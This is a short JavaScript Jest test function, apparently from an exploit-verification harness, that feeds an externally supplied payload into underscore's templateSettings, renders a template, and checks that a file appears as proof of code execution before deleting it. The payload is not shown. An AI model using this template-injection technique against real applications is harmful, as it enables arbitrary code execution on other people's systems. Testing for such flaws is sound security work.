function exploitFunction(payload) {
  const _ = require("underscore");
  const fs = require("fs");

  const path = "./underscore";

  file_exist = fs.existsSync(path);
  expect.assertions(2);
  expect(file_exist).toBe(false);

  _.templateSettings = payload.templateSettings;

  const t = _.template("")();
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };